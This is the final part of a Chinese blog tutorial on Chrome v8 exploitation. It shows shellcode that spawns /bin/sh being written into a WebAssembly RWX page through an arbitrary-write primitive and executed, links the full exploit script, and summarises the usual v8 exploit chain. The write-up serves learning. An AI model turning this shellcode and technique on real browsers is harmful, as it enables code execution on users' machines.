+<p>将shellcode写入RWX页中：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Write shellcode and execute &quot;WASM code&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">106</span>, <span class="number">104</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">write_at</span>(rwx_page_start + <span class="number">0xf00n</span> + <span class="title class_">BigInt</span>(i), <span class="title class_">BigInt</span>(shellcode[i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Ready to execute shellcode!&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> d = <span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>
+<p><img src="7.png" alt="" /></p>
+<p>攻击成功。</p>
+<p>完整JS代码：<a href="exp.js">exp.js</a></p>
+<h1 id="e-阶段总结"><a class="markdownIt-Anchor" href="#e-阶段总结"></a> E. 阶段总结</h1>
+<p>在前面3篇blog中，我们讨论了不加沙箱的Chrome v8的相关漏洞利用策略，总的来说，Chrome v8的漏洞利用路线是非常固定的，基本都是从类型混淆开始，到可以获得对象地址以及将一个地址作为对象，再到任意地址读写，最后各显神通。</p>
+<p>在后面的学习中，我们就需要应对带有沙箱的更新的版本的Chrome v8，浅看了一些blog，发现利用的路径应该也比较固定。一路走来，从Javascript的解析再到WASM，可以发现Chrome v8集成了很多的功能，值得我们深入探索。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/" rel="prev" title="chrome v8 pwn 学习 (2)">
+      <i class="fa fa-chevron-left"></i> chrome v8 pwn 学习 (2)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#d-utilize-wasm"><span class="nav-number">1.</span> <span class="nav-text"> D. Utilize WASM</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#d1-installation-trial"><span class="nav-number">1.1.</span> <span class="nav-text"> D.1 Installation &amp;&amp; Trial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d2-wasm-code-path"><span class="nav-number">1.2.</span> <span class="nav-text"> D.2 WASM Code Path</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#a-functionshared_info-offset-0x18"><span class="nav-number">1.2.1.</span> <span class="nav-text"> A. Function.shared_info (offset 0x18)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#b-sharedfunctioninfodata-offset-8"><span class="nav-number">1.2.2.</span> <span class="nav-text"> B. SharedFunctionInfo.data (offset 8)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c-wasmexportedfunctiondatainstance-offset-0x10"><span class="nav-number">1.2.3.</span> <span class="nav-text"> C. WasmExportedFunctionData.instance (offset 0x10)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#d-wasminstanceobject-0x88"><span class="nav-number">1.2.4.</span> <span class="nav-text"> D. WasmInstanceObject + 0x88</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d3-chrome-v8-double-kill"><span class="nav-number">1.3.</span> <span class="nav-text"> D.3 Chrome v8 Double Kill</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#e-%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text"> E. 阶段总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CoLin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">163</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CoLin</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">23:01</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
